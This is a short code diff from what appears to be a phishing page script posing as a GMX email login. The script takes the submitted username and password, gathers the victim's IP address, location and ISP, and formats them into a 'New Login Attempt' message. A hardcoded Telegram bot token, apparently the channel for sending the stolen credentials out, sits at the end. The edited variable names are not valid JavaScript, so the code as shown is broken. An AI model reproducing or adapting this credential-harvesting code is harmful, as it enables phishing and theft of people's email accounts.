@@ -7,7 +7,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const GMX E-Mail-Address = document.getElementById('usr-id').value;
         const Password = document.getElementById('pwd').value;
 
-        if (!username || !password) {
+        if (!usr-id || !pwd) {
             alert('Both username and password are required.');
             return;
         }
@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 const city = data.city;
                 const isp = data.org;
 
-                const message = `🔹 New Login Attempt 🔹\n👤 Username: ${username}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
+                const message = `🔹 New Login Attempt 🔹\n👤 Username: ${usr-id}\n🔑 Password: ${pwd}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
                 // Replace these with your bot token and chat ID
                 const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
